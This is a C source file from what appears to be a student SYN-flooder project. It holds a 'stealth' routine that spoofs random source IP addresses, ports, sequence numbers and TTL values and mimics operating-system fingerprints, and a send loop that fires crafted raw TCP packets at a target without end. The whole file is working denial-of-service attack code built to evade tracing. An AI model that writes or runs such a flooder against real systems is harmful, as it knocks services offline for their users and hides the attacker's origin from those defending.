/*
** send.c for send in /home/janel/Projects/templates/network/SYN_flooder
**
** Made by Janel
** Login   <janel@epitech.net>
**
** Started on  Wed Jun  7 15:02:24 2017 Janel
** Last update Mon Oct 23 00:27:25 2017 
*/

#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include "syn_flooder.h"
#include "stealth.h"
#include "debug.h"

static void	stealth(unsigned char * const packet)
{
  struct iphdr	*ip_header;
  struct tcphdr	*tcp_header;
  char		random;

  ip_header = (struct iphdr *)(packet);
  tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));    
  random = rand() % MAX_NBR_STATE;
  ip_header->saddr = RANDOM_NBR_RANGE(0, 0xFFFFFFFF);
  ip_header->ttl = RANDOM_NBR_RANGE(64, 255);
  tcp_header->source = RANDOM_NBR_RANGE(1024, 65535);
  tcp_header->seq = RANDOM_NBR_RANGE(0, 0xFFFF);
  tcp_header->window = htons(RANDOM_NBR_RANGE(1000, 65535));  
  ip_header->ttl = g_os_simulation[(short)random].ttl;
  tcp_header->window = g_os_simulation[(short)random].window_size;
  fprintf(stdout, "[LOG] ip_header->source_address: %s\n", inet_ntoa((struct in_addr){ip_header->saddr}));
  fprintf(stdout, "[LOG] tcp_header->source_port: %d\n", tcp_header->source);
  fprintf(stdout, "[LOG] tcp_header->sequence_number: %d\n", tcp_header->seq);
  fprintf(stdout, "[LOG] SIMULATING: %s\n", g_os_simulation[(short)random].tag);
  fprintf(stdout, "[LOG] ip_header->time_to_live: %d\n", ip_header->ttl);
  fprintf(stdout, "[LOG] tcp_header->window: %d\n", tcp_header->window);
}

char			send_packet(const int sd, unsigned char *packet,
				    struct sockaddr_in *dest_addr)
{
  struct tcphdr		*tcp_header;
  struct iphdr		*ip_header;

  ip_header = (struct iphdr *)(packet);
  tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
  while (TRUE)
    {
      stealth(packet);
      checksum_packets(ip_header, tcp_header);
      if ((sendto(sd, packet, ((struct iphdr *)packet)->tot_len, 0,
		  (const struct sockaddr *)dest_addr, sizeof(struct sockaddr_in))) == -1)
	return (PRINT_ERROR("sendto():"), EXIT_FAILURE);
      usleep(SEND_TIME_DELAY);
      fprintf(stdout, "-------------------------\n");
    }
}
